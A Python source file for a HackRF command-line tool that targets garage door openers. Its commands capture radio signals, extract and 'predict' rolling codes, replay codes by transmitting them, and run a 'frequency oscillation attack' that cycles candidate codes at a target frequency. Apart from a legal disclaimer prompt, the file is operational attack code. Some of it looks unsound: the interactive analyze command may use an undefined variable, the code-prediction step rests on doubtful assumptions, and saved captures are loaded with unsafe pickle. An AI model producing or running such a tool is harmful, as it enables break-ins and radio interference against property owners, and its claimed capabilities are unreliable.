#!/usr/bin/env python3
"""
HackRF Command-Line Interface for Garage Door Signal Analysis

This script provides a direct command-line interface for HackRF hardware to perform
garage door signal analysis and frequency manipulation operations.
For educational and security research purposes only.
"""

import argparse
import logging
import sys
import time
import numpy as np
import pickle
from typing import List, Dict, Any, Optional, Tuple
import coloredlogs

# Ensure hackrf is available
try:
    import hackrf
except ImportError:
    print("ERROR: HackRF module not found. Please install it with: pip install hackrf")
    print("If you've already installed it, ensure your HackRF hardware is properly connected.")
    sys.exit(1)

from frequency_handler import FrequencyHandler
from rolling_code import RollingCodeAnalyzer
from code_predictor import CodePredictor

# Configure logging
coloredlogs.install(
    level='INFO',
    fmt='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%H:%M:%S'
)

def print_legal_disclaimer():
    """Print the legal disclaimer for the tool."""
    print("\n" + "=" * 80)
    print("LEGAL DISCLAIMER".center(80))
    print("=" * 80)
    print("""
This tool is provided for EDUCATIONAL and SECURITY RESEARCH purposes ONLY.

Use of this software to access garage door systems or other property without 
explicit permission from the owner is illegal and unethical. The authors and 
distributors of this software accept no liability for misuse of this tool.

By using this software, you agree to:
1. Only use it on systems you own or have explicit permission to test
2. Follow all applicable local, state, and federal laws
3. Use the tool responsibly and ethically
""")
    print("=" * 80 + "\n")
    
    # Require acknowledgment
    try:
        response = input("Do you understand and agree to these terms? (yes/no): ")
        if response.lower() not in ['yes', 'y']:
            print("You must agree to the terms to use this tool.")
            sys.exit(0)
    except KeyboardInterrupt:
        print("\nExiting...")
        sys.exit(0)

class HackRFInterface:
    """Command-line interface for HackRF operations specific to garage door signal analysis."""
    
    def __init__(self):
        """Initialize the HackRF interface."""
        self.device = None
        self.sample_rate = 2e6  # 2 MHz
        self.center_freq = 315e6  # Default to 315 MHz
        self.gain = 40.0
        self.frequency_handler = FrequencyHandler(center_freq=self.center_freq)
        self.code_analyzer = RollingCodeAnalyzer()
        self.code_predictor = CodePredictor()
        
    def setup_device(self):
        """Initialize and configure the HackRF device."""
        try:
            logging.info("Initializing HackRF device...")
            self.device = hackrf.HackRF()
            self.device.sample_rate = self.sample_rate
            self.device.center_freq = self.center_freq
            self.device.rx_gain = self.gain
            self.device.enable_amp = True
            logging.info("HackRF device initialized successfully")
            
            # Print device info
            self._print_device_info()
            return True
        except Exception as e:
            logging.error(f"Failed to initialize HackRF device: {e}")
            return False
            
    def _print_device_info(self):
        """Print information about the connected HackRF device."""
        if not self.device:
            logging.error("No HackRF device initialized")
            return
        
        logging.info("HackRF Device Information:")
        logging.info(f"  Board ID: {self.device.board_id}")
        logging.info(f"  Version String: {self.device.version_string}")
        logging.info(f"  Serial Number: {self.device.serial_number}")
        logging.info(f"  Current Settings:")
        logging.info(f"    Sample Rate: {self.sample_rate/1e6} MHz")
        logging.info(f"    Center Frequency: {self.center_freq/1e6} MHz")
        logging.info(f"    RX Gain: {self.gain} dB")
    
    def capture_signal(self, duration: int = 10, output_file: Optional[str] = None) -> np.ndarray:
        """
        Capture a signal using HackRF at the current frequency.
        
        Args:
            duration: Duration in seconds
            output_file: Optional file to save the captured data
            
        Returns:
            Numpy array containing captured signal data
        """
        if not self.device:
            if not self.setup_device():
                return np.array([])
        
        logging.info(f"Capturing signal for {duration} seconds at {self.center_freq/1e6} MHz")
        
        # Calculate number of samples
        num_samples = int(self.sample_rate * duration)
        samples = np.zeros(num_samples, dtype=np.complex64)
        
        try:
            # Start RX mode
            self.device.start_rx_mode()
            
            # Show progress
            start_time = time.time()
            samples_read = 0
            
            # Create a progress bar
            print("\nCapturing: ", end="")
            progress_bar_width = 40
            
            # Read samples
            while samples_read < num_samples:
                remaining = num_samples - samples_read
                buffer_size = min(262144, remaining)  # 256K chunks
                buffer = self.device.read_samples(buffer_size)
                
                if len(buffer) == 0:
                    break
                    
                samples[samples_read:samples_read + len(buffer)] = buffer
                samples_read += len(buffer)
                
                # Update progress bar
                elapsed = time.time() - start_time
                if elapsed > 0:
                    progress = min(samples_read / num_samples, 1.0)
                    bars = int(progress_bar_width * progress)
                    print(f"\rCapturing: [{'#' * bars}{' ' * (progress_bar_width - bars)}] {int(progress*100)}% ({elapsed:.1f}s/{duration}s)", end="")
            
            print("\nCapture complete!")
            
            # Stop RX mode
            self.device.stop_rx_mode()
            
            # Trim if we didn't read all samples
            if samples_read < num_samples:
                samples = samples[:samples_read]
                logging.warning(f"Only captured {samples_read} samples ({samples_read/self.sample_rate:.2f}s)")
            
            logging.info(f"Captured {len(samples)} samples")
            
            # Save to file if requested
            if output_file:
                self._save_signal(samples, output_file)
            
            return samples
            
        except KeyboardInterrupt:
            logging.info("Capture interrupted by user")
            if self.device:
                self.device.stop_rx_mode()
            return samples[:samples_read] if samples_read > 0 else np.array([])
            
        except Exception as e:
            logging.error(f"Error during signal capture: {e}")
            if self.device:
                try:
                    self.device.stop_rx_mode()
                except:
                    pass
            return np.array([])
    
    def _save_signal(self, signal_data: np.ndarray, filename: str) -> None:
        """Save captured signal data to a file."""
        try:
            with open(filename, 'wb') as f:
                pickle.dump({
                    'data': signal_data,
                    'sample_rate': self.sample_rate,
                    'center_freq': self.center_freq,
                    'timestamp': np.datetime64('now')
                }, f)
            logging.info(f"Saved {len(signal_data)} samples to {filename}")
        except Exception as e:
            logging.error(f"Failed to save signal data: {e}")
    
    def load_signal(self, filename: str) -> np.ndarray:
        """Load signal data from a file."""
        try:
            with open(filename, 'rb') as f:
                data = pickle.load(f)
            
            if isinstance(data, dict) and 'data' in data:
                signal_data = data['data']
                if 'sample_rate' in data:
                    self.sample_rate = data['sample_rate']
                if 'center_freq' in data:
                    self.center_freq = data['center_freq']
                    self.frequency_handler.set_frequency(self.center_freq)
                
                logging.info(f"Loaded {len(signal_data)} samples from {filename}")
                return signal_data
                
            return data
            
        except Exception as e:
            logging.error(f"Failed to load signal data: {e}")
            return np.array([])
    
    def analyze_signal(self, signal_data: np.ndarray) -> Dict:
        """
        Analyze the captured signal to extract codes and characteristics.
        
        Args:
            signal_data: Signal data as numpy array
            
        Returns:
            Dictionary with analysis results
        """
        if len(signal_data) == 0:
            logging.error("Cannot analyze empty signal data")
            return {}
        
        logging.info("Analyzing signal...")
        
        # Extract codes
        codes = self.code_analyzer.extract_codes(signal_data)
        
        # Calculate signal statistics
        power = np.mean(np.abs(signal_data) ** 2)
        peak = np.max(np.abs(signal_data))
        
        # Calculate frequency spectrum
        spectrum = np.fft.fftshift(np.fft.fft(signal_data))
        freq = np.fft.fftshift(np.fft.fftfreq(len(signal_data), 1/self.sample_rate))
        
        # Find peak frequencies
        peak_idx = np.argsort(np.abs(spectrum))[-5:]
        peak_freqs = freq[peak_idx]
        
        # Calculate SNR
        signal_power = np.mean(np.sort(np.abs(spectrum) ** 2)[-int(len(spectrum)*0.1):])
        noise_power = np.mean(np.sort(np.abs(spectrum) ** 2)[:int(len(spectrum)*0.8)])
        snr = 10 * np.log10(signal_power / noise_power) if noise_power > 0 else 0
        
        # Prepare result
        result = {
            'duration': len(signal_data) / self.sample_rate,
            'sample_rate': self.sample_rate,
            'center_frequency': self.center_freq,
            'power': power,
            'peak_amplitude': peak,
            'snr_db': snr,
            'codes': codes,
            'num_codes': len(codes)
        }
        
        self._print_analysis_result(result)
        return result
    
    def _print_analysis_result(self, result: Dict):
        """Print analysis results in a readable format."""
        print("\n" + "=" * 60)
        print("SIGNAL ANALYSIS RESULTS".center(60))
        print("=" * 60)
        
        print(f"Duration: {result['duration']:.2f} seconds")
        print(f"Center Frequency: {result['center_frequency']/1e6:.3f} MHz")
        print(f"Signal Power: {10*np.log10(result['power']):.2f} dB")
        print(f"Signal-to-Noise Ratio: {result['snr_db']:.2f} dB")
        
        print("\nExtracted Codes:")
        if result['num_codes'] == 0:
            print("  No rolling codes detected in signal")
        else:
            for i, code in enumerate(result['codes']):
                # Format binary code for readability
                formatted_code = ' '.join([code[i:i+8] for i in range(0, len(code), 8)])
                print(f"  Code {i+1}: {formatted_code}")
        
        print("=" * 60 + "\n")
    
    def predict_codes(self, code_list: List[str]) -> Dict:
        """
        Predict potential next rolling codes based on observed codes.
        
        Args:
            code_list: List of observed binary codes
            
        Returns:
            Dictionary with prediction results
        """
        logging.info("Analyzing code patterns and generating predictions...")
        
        # Analyze code sequence
        analysis = self.code_predictor.analyze_code_sequence(code_list)
        
        # Predict next codes
        predictions = self.code_predictor.predict_next_codes(code_list)
        
        # Prepare results
        result = {
            'observed_codes': code_list,
            'num_observed': len(code_list),
            'predictions': predictions,
            'num_predictions': len(predictions),
            'analysis': analysis
        }
        
        self._print_prediction_result(result)
        return result
    
    def _print_prediction_result(self, result: Dict):
        """Print prediction results in a readable format."""
        print("\n" + "=" * 60)
        print("CODE PREDICTION RESULTS".center(60))
        print("=" * 60)
        
        print(f"Observed {result['num_observed']} codes")
        
        print("\nCode Analysis:")
        analysis = result['analysis']
        for key, value in analysis.items():
            if key == 'likely_algorithms':
                print(f"  Likely Algorithms: {', '.join(value)}")
            elif key == 'pattern_type':
                print(f"  Pattern Type: {value}")
            elif key == 'confidence':
                print(f"  Prediction Confidence: {value*100:.1f}%")
            elif key == 'code_length':
                print(f"  Code Length: {value} bits")
            else:
                print(f"  {key}: {value}")
        
        print("\nPredicted Next Codes:")
        if result['num_predictions'] == 0:
            print("  Unable to generate predictions from provided codes")
        else:
            for i, code in enumerate(result['predictions']):
                # Format binary code for readability
                formatted_code = ' '.join([code[i:i+8] for i in range(0, len(code), 8)])
                print(f"  Prediction {i+1}: {formatted_code}")
        
        print("=" * 60 + "\n")
    
    def perform_oscillation(self, duration: int = 5, bandwidth: float = 200e3, 
                          oscillation_rate: float = 10.0, output_file: Optional[str] = None):
        """
        Generate and transmit a frequency oscillation signal.
        
        Args:
            duration: Duration in seconds
            bandwidth: Bandwidth in Hz 
            oscillation_rate: Oscillation rate in Hz
            output_file: Optional file to save the generated signal
        """
        if not self.device:
            if not self.setup_device():
                return
        
        logging.info(f"Generating frequency oscillation around {self.center_freq/1e6} MHz")
        logging.info(f"Bandwidth: {bandwidth/1e3} kHz, Rate: {oscillation_rate} Hz, Duration: {duration}s")
        
        try:
            # Generate oscillating signal
            signal = self.frequency_handler.oscillate_frequency(
                center_freq=self.center_freq,
                bandwidth=bandwidth,
                oscillation_rate=oscillation_rate,
                duration=duration,
                sample_rate=self.sample_rate
            )
            
            # Save if requested
            if output_file:
                self._save_signal(signal, output_file)
                
            # Configure device for transmission
            self.device.tx_gain = 20  # Set TX gain
            
            # Start TX mode
            self.device.start_tx_mode()
            
            # Transmit signal
            logging.info("Transmitting oscillation signal...")
            
            # Create progress indicator
            start_time = time.time()
            print("\nTransmitting: ", end="")
            progress_bar_width = 40
            
            # Send samples in chunks
            chunk_size = 262144  # 256K samples per chunk
            total_samples = len(signal)
            samples_sent = 0
            
            while samples_sent < total_samples:
                chunk_end = min(samples_sent + chunk_size, total_samples)
                chunk = signal[samples_sent:chunk_end]
                
                self.device.write_samples(chunk)
                samples_sent += len(chunk)
                
                # Update progress bar
                elapsed = time.time() - start_time
                if elapsed > 0:
                    progress = min(samples_sent / total_samples, 1.0)
                    bars = int(progress_bar_width * progress)
                    print(f"\rTransmitting: [{'#' * bars}{' ' * (progress_bar_width - bars)}] {int(progress*100)}% ({elapsed:.1f}s/{duration}s)", end="")
            
            print("\nTransmission complete!")
            
            # Stop TX mode
            self.device.stop_tx_mode()
            
        except KeyboardInterrupt:
            logging.info("Transmission interrupted by user")
            if self.device:
                self.device.stop_tx_mode()
                
        except Exception as e:
            logging.error(f"Error during oscillation: {e}")
            if self.device:
                try:
                    self.device.stop_tx_mode()
                except:
                    pass
    
    def perform_sweep(self, start_freq: float, end_freq: float, sweep_time: float = 5.0, 
                    output_file: Optional[str] = None):
        """
        Generate and transmit a frequency sweep signal.
        
        Args:
            start_freq: Start frequency in Hz
            end_freq: End frequency in Hz
            sweep_time: Duration of sweep in seconds
            output_file: Optional file to save the generated signal
        """
        if not self.device:
            if not self.setup_device():
                return
        
        logging.info(f"Generating frequency sweep from {start_freq/1e6} MHz to {end_freq/1e6} MHz")
        logging.info(f"Sweep time: {sweep_time}s")
        
        try:
            # Generate sweep signal
            signal = self.frequency_handler.frequency_sweep(
                start_freq=start_freq,
                end_freq=end_freq,
                sweep_time=sweep_time,
                sample_rate=self.sample_rate
            )
            
            # Save if requested
            if output_file:
                self._save_signal(signal, output_file)
                
            # Configure device for transmission
            self.device.tx_gain = 20  # Set TX gain
            
            # Start TX mode
            self.device.start_tx_mode()
            
            # Transmit signal
            logging.info("Transmitting sweep signal...")
            
            # Create progress indicator
            start_time = time.time()
            print("\nTransmitting: ", end="")
            progress_bar_width = 40
            
            # Send samples in chunks
            chunk_size = 262144  # 256K samples per chunk
            total_samples = len(signal)
            samples_sent = 0
            
            while samples_sent < total_samples:
                chunk_end = min(samples_sent + chunk_size, total_samples)
                chunk = signal[samples_sent:chunk_end]
                
                self.device.write_samples(chunk)
                samples_sent += len(chunk)
                
                # Update progress bar
                elapsed = time.time() - start_time
                if elapsed > 0:
                    progress = min(samples_sent / total_samples, 1.0)
                    bars = int(progress_bar_width * progress)
                    print(f"\rTransmitting: [{'#' * bars}{' ' * (progress_bar_width - bars)}] {int(progress*100)}% ({elapsed:.1f}s/{sweep_time}s)", end="")
            
            print("\nTransmission complete!")
            
            # Stop TX mode
            self.device.stop_tx_mode()
            
        except KeyboardInterrupt:
            logging.info("Transmission interrupted by user")
            if self.device:
                self.device.stop_tx_mode()
                
        except Exception as e:
            logging.error(f"Error during sweep: {e}")
            if self.device:
                try:
                    self.device.stop_tx_mode()
                except:
                    pass
    
    def transmit_code(self, code: str, repeat: int = 3, interval: float = 0.5):
        """
        Transmit a rolling code using OOK modulation.
        
        Args:
            code: Binary code to transmit
            repeat: Number of times to repeat transmission
            interval: Interval between repetitions in seconds
        """
        if not self.device:
            if not self.setup_device():
                return
        
        # Clean and validate code
        code = code.replace(' ', '')
        if not all(bit in '01' for bit in code):
            logging.error("Invalid code format. Must be binary (0s and 1s)")
            return
            
        logging.info(f"Transmitting code at {self.center_freq/1e6} MHz")
        logging.info(f"Code: {code}")
        logging.info(f"Repeat: {repeat} times, Interval: {interval}s")
        
        try:
            for i in range(repeat):
                if i > 0:
                    logging.info(f"Waiting {interval}s before next transmission...")
                    time.sleep(interval)
                
                logging.info(f"Transmission {i+1}/{repeat}")
                
                # Generate modulated signal
                signal = self.frequency_handler.generate_modulated_signal(
                    code=code, 
                    sample_rate=self.sample_rate,
                    modulation='OOK'
                )
                
                # Configure device for transmission
                self.device.tx_gain = 20  # Set TX gain
                
                # Start TX mode
                self.device.start_tx_mode()
                
                # Transmit signal
                self.device.write_samples(signal)
                
                # Stop TX mode
                self.device.stop_tx_mode()
                
                logging.info(f"Transmission {i+1} complete")
            
            logging.info("All transmissions complete")
            
        except KeyboardInterrupt:
            logging.info("Transmission interrupted by user")
            if self.device:
                self.device.stop_tx_mode()
                
        except Exception as e:
            logging.error(f"Error during code transmission: {e}")
            if self.device:
                try:
                    self.device.stop_tx_mode()
                except:
                    pass
    
    def perform_oscillation_attack(self, code_list: List[str], pattern: str = 'sinusoidal',
                                 duration: int = 30, bandwidth: float = 200e3):
        """
        Perform a frequency oscillation attack using the provided codes.
        
        Args:
            code_list: List of binary codes to try
            pattern: Oscillation pattern ('linear', 'sinusoidal', 'random')
            duration: Total attack duration in seconds
            bandwidth: Bandwidth of oscillation in Hz
        """
        if not self.device:
            if not self.setup_device():
                return
        
        # Validate codes
        valid_codes = []
        for code in code_list:
            clean_code = code.replace(' ', '')
            if all(bit in '01' for bit in clean_code):
                valid_codes.append(clean_code)
        
        if not valid_codes:
            logging.error("No valid codes provided for attack")
            return
            
        logging.warning(f"Performing frequency oscillation attack at {self.center_freq/1e6} MHz")
        logging.warning(f"Using {len(valid_codes)} codes with {pattern} oscillation pattern")
        logging.warning(f"Duration: {duration}s, Bandwidth: {bandwidth/1e3} kHz")
        
        try:
            # Start attack
            result = self.frequency_handler.frequency_oscillation_attack(
                target_freq=self.center_freq,
                code_list=valid_codes,
                oscillation_pattern=pattern,
                attack_duration=duration,
                bandwidth=bandwidth
            )
            
            if result:
                logging.warning("Attack completed - potential success detected")
            else:
                logging.warning("Attack completed - no success detected")
                
        except KeyboardInterrupt:
            logging.info("Attack interrupted by user")
            if self.device:
                try:
                    self.device.stop_tx_mode()
                except:
                    pass
                
        except Exception as e:
            logging.error(f"Error during attack: {e}")
            if self.device:
                try:
                    self.device.stop_tx_mode()
                except:
                    pass
    
    def cleanup(self):
        """Clean up resources and close HackRF device."""
        if self.device:
            try:
                logging.info("Closing HackRF device...")
                self.device.close()
                logging.info("HackRF device closed")
            except Exception as e:
                logging.error(f"Error closing HackRF device: {e}")
            finally:
                self.device = None

def parse_arguments():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(
        description='HackRF Garage Door Signal Analysis Tool',
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    
    # Create subparsers for different commands
    subparsers = parser.add_subparsers(dest='command', help='Command to execute')
    
    # Device info command
    info_parser = subparsers.add_parser('info', help='Show HackRF device information')
    
    # Capture command
    capture_parser = subparsers.add_parser('capture', help='Capture signal')
    capture_parser.add_argument('-f', '--frequency', type=float, default=315.0,
                             help='Center frequency in MHz')
    capture_parser.add_argument('-d', '--duration', type=int, default=10,
                             help='Capture duration in seconds')
    capture_parser.add_argument('-g', '--gain', type=float, default=40.0,
                             help='RX gain in dB')
    capture_parser.add_argument('-o', '--output', type=str,
                             help='Output file for captured data')
    capture_parser.add_argument('-a', '--analyze', action='store_true',
                             help='Analyze signal after capture')
    
    # Load command
    load_parser = subparsers.add_parser('load', help='Load signal from file')
    load_parser.add_argument('filename', type=str, help='Signal file to load')
    load_parser.add_argument('-a', '--analyze', action='store_true',
                          help='Analyze loaded signal')
    
    # Analyze command
    analyze_parser = subparsers.add_parser('analyze', help='Analyze signal')
    analyze_parser.add_argument('filename', type=str, help='Signal file to analyze')
    
    # Predict command
    predict_parser = subparsers.add_parser('predict', help='Predict next rolling codes')
    predict_parser.add_argument('codes', type=str, nargs='+',
                             help='List of observed binary codes')
    
    # Oscillate command
    oscillate_parser = subparsers.add_parser('oscillate', help='Generate frequency oscillation')
    oscillate_parser.add_argument('-f', '--frequency', type=float, default=315.0,
                               help='Center frequency in MHz')
    oscillate_parser.add_argument('-b', '--bandwidth', type=float, default=200.0,
                               help='Bandwidth in kHz')
    oscillate_parser.add_argument('-r', '--rate', type=float, default=10.0,
                               help='Oscillation rate in Hz')
    oscillate_parser.add_argument('-d', '--duration', type=int, default=5,
                               help='Duration in seconds')
    oscillate_parser.add_argument('-o', '--output', type=str,
                               help='Output file for generated signal')
    
    # Sweep command
    sweep_parser = subparsers.add_parser('sweep', help='Generate frequency sweep')
    sweep_parser.add_argument('-s', '--start', type=float, required=True,
                           help='Start frequency in MHz')
    sweep_parser.add_argument('-e', '--end', type=float, required=True,
                           help='End frequency in MHz')
    sweep_parser.add_argument('-d', '--duration', type=float, default=5.0,
                           help='Sweep duration in seconds')
    sweep_parser.add_argument('-o', '--output', type=str,
                           help='Output file for generated signal')
    
    # Transmit command
    transmit_parser = subparsers.add_parser('transmit', help='Transmit rolling code')
    transmit_parser.add_argument('-f', '--frequency', type=float, default=315.0,
                              help='Transmit frequency in MHz')
    transmit_parser.add_argument('-c', '--code', type=str, required=True,
                              help='Binary code to transmit')
    transmit_parser.add_argument('-r', '--repeat', type=int, default=3,
                              help='Number of times to repeat transmission')
    transmit_parser.add_argument('-i', '--interval', type=float, default=0.5,
                              help='Interval between repetitions in seconds')
    
    # Attack command
    attack_parser = subparsers.add_parser('attack', help='Perform frequency oscillation attack')
    attack_parser.add_argument('-f', '--frequency', type=float, default=315.0,
                            help='Target frequency in MHz')
    attack_parser.add_argument('-c', '--codes', type=str, nargs='+', required=True,
                            help='List of binary codes to try')
    attack_parser.add_argument('-p', '--pattern', choices=['linear', 'sinusoidal', 'random'],
                            default='sinusoidal', help='Oscillation pattern')
    attack_parser.add_argument('-d', '--duration', type=int, default=30,
                            help='Total attack duration in seconds')
    attack_parser.add_argument('-b', '--bandwidth', type=float, default=200.0,
                            help='Bandwidth in kHz')
    
    # Parser for interactive mode
    interactive_parser = subparsers.add_parser('interactive', help='Start interactive mode')
    
    # General options
    parser.add_argument('-v', '--verbose', action='store_true',
                      help='Enable verbose output')
    
    return parser.parse_args()

def interactive_mode(interface):
    """Run the interface in interactive mode."""
    print("\n" + "=" * 60)
    print("HACKRF GARAGE DOOR SIGNAL ANALYZER - INTERACTIVE MODE".center(60))
    print("=" * 60)
    print("Type 'help' for available commands, 'exit' to quit.")
    
    while True:
        try:
            command = input("\n> ").strip()
            
            if command in ['exit', 'quit']:
                break
                
            elif command == 'help':
                print("\nAvailable commands:")
                print("  info                   - Show HackRF device information")
                print("  capture [duration]     - Capture signal for specified duration (seconds)")
                print("  load <filename>        - Load signal from file")
                print("  analyze               - Analyze the last captured/loaded signal")
                print("  predict <code1> <code2> ... - Predict next codes based on observed codes")
                print("  oscillate [duration] [bandwidth] [rate] - Generate frequency oscillation")
                print("  sweep <start> <end> [duration] - Generate frequency sweep")
                print("  transmit <code> [repeat] [interval] - Transmit a code")
                print("  attack <code1> <code2> ... [duration] [pattern] - Perform oscillation attack")
                print("  setfreq <freq_mhz>    - Set center frequency in MHz")
                print("  setgain <gain_db>     - Set RX gain in dB")
                print("  exit/quit             - Exit interactive mode")
                
            elif command == 'info':
                interface.setup_device()
                
            elif command.startswith('capture'):
                parts = command.split()
                duration = int(parts[1]) if len(parts) > 1 else 10
                signal = interface.capture_signal(duration=duration)
                if len(signal) > 0:
                    interface.analyze_signal(signal)
                
            elif command.startswith('load'):
                parts = command.split()
                if len(parts) > 1:
                    signal = interface.load_signal(parts[1])
                    if len(signal) > 0:
                        print(f"Loaded signal from {parts[1]}")
                else:
                    print("Usage: load <filename>")
                
            elif command == 'analyze':
                # Assume last signal is still in memory
                interface.analyze_signal(signal)
                
            elif command.startswith('predict'):
                parts = command.split()
                if len(parts) > 1:
                    interface.predict_codes(parts[1:])
                else:
                    print("Usage: predict <code1> <code2> ...")
                
            elif command.startswith('oscillate'):
                parts = command.split()
                duration = int(parts[1]) if len(parts) > 1 else 5
                bandwidth = float(parts[2])*1e3 if len(parts) > 2 else 200e3
                rate = float(parts[3]) if len(parts) > 3 else 10.0
                interface.perform_oscillation(duration=duration, bandwidth=bandwidth, 
                                           oscillation_rate=rate)
                
            elif command.startswith('sweep'):
                parts = command.split()
                if len(parts) > 2:
                    start_freq = float(parts[1])*1e6
                    end_freq = float(parts[2])*1e6
                    duration = float(parts[3]) if len(parts) > 3 else 5.0
                    interface.perform_sweep(start_freq, end_freq, duration)
                else:
                    print("Usage: sweep <start_mhz> <end_mhz> [duration]")
                
            elif command.startswith('transmit'):
                parts = command.split()
                if len(parts) > 1:
                    code = parts[1]
                    repeat = int(parts[2]) if len(parts) > 2 else 3
                    interval = float(parts[3]) if len(parts) > 3 else 0.5
                    interface.transmit_code(code, repeat, interval)
                else:
                    print("Usage: transmit <code> [repeat] [interval]")
                
            elif command.startswith('attack'):
                parts = command.split()
                if len(parts) > 1:
                    codes = parts[1:-2] if len(parts) > 3 else parts[1:]
                    duration = int(parts[-2]) if len(parts) > 2 else 30
                    pattern = parts[-1] if len(parts) > 3 and parts[-1] in ['linear', 'sinusoidal', 'random'] else 'sinusoidal'
                    interface.perform_oscillation_attack(codes, pattern, duration)
                else:
                    print("Usage: attack <code1> <code2> ... [duration] [pattern]")
                
            elif command.startswith('setfreq'):
                parts = command.split()
                if len(parts) > 1:
                    freq = float(parts[1])
                    interface.center_freq = freq * 1e6
                    interface.frequency_handler.set_frequency(interface.center_freq)
                    print(f"Center frequency set to {freq} MHz")
                else:
                    print("Usage: setfreq <freq_mhz>")
                
            elif command.startswith('setgain'):
                parts = command.split()
                if len(parts) > 1:
                    gain = float(parts[1])
                    interface.gain = gain
                    if interface.device:
                        interface.device.rx_gain = gain
                    print(f"RX gain set to {gain} dB")
                else:
                    print("Usage: setgain <gain_db>")
                
            else:
                print(f"Unknown command: {command}")
                print("Type 'help' for available commands.")
                
        except KeyboardInterrupt:
            print("\nOperation interrupted")
            
        except Exception as e:
            logging.error(f"Error executing command: {e}")

def main():
    """Main entry point for the HackRF interface."""
    args = parse_arguments()
    
    # Set up logging
    if args.verbose:
        coloredlogs.install(level='DEBUG')
    else:
        coloredlogs.install(level='INFO')
    
    # Print disclaimer
    print_legal_disclaimer()
    
    # Create interface
    interface = HackRFInterface()
    
    try:
        if args.command == 'info':
            interface.setup_device()
            
        elif args.command == 'capture':
            # Set parameters
            interface.center_freq = args.frequency * 1e6
            interface.gain = args.gain
            interface.frequency_handler.set_frequency(interface.center_freq)
            
            # Capture signal
            signal = interface.capture_signal(
                duration=args.duration,
                output_file=args.output
            )
            
            # Analyze if requested
            if args.analyze and len(signal) > 0:
                interface.analyze_signal(signal)
                
        elif args.command == 'load':
            signal = interface.load_signal(args.filename)
            
            # Analyze if requested
            if args.analyze and len(signal) > 0:
                interface.analyze_signal(signal)
                
        elif args.command == 'analyze':
            signal = interface.load_signal(args.filename)
            if len(signal) > 0:
                interface.analyze_signal(signal)
                
        elif args.command == 'predict':
            interface.predict_codes(args.codes)
            
        elif args.command == 'oscillate':
            # Set parameters
            interface.center_freq = args.frequency * 1e6
            interface.frequency_handler.set_frequency(interface.center_freq)
            
            # Perform oscillation
            interface.perform_oscillation(
                duration=args.duration,
                bandwidth=args.bandwidth * 1e3,  # Convert kHz to Hz
                oscillation_rate=args.rate,
                output_file=args.output
            )
            
        elif args.command == 'sweep':
            # Perform sweep
            interface.perform_sweep(
                start_freq=args.start * 1e6,  # Convert MHz to Hz
                end_freq=args.end * 1e6,      # Convert MHz to Hz
                sweep_time=args.duration,
                output_file=args.output
            )
            
        elif args.command == 'transmit':
            # Set parameters
            interface.center_freq = args.frequency * 1e6
            interface.frequency_handler.set_frequency(interface.center_freq)
            
            # Transmit code
            interface.transmit_code(
                code=args.code,
                repeat=args.repeat,
                interval=args.interval
            )
            
        elif args.command == 'attack':
            # Set parameters
            interface.center_freq = args.frequency * 1e6
            interface.frequency_handler.set_frequency(interface.center_freq)
            
            # Perform attack
            interface.perform_oscillation_attack(
                code_list=args.codes,
                pattern=args.pattern,
                duration=args.duration,
                bandwidth=args.bandwidth * 1e3  # Convert kHz to Hz
            )
            
        elif args.command == 'interactive' or args.command is None:
            interactive_mode(interface)
            
    except KeyboardInterrupt:
        logging.info("Operation interrupted by user")
    except Exception as e:
        logging.error(f"Error: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
    finally:
        interface.cleanup()
        logging.info("Exiting...")

if __name__ == "__main__":
    main()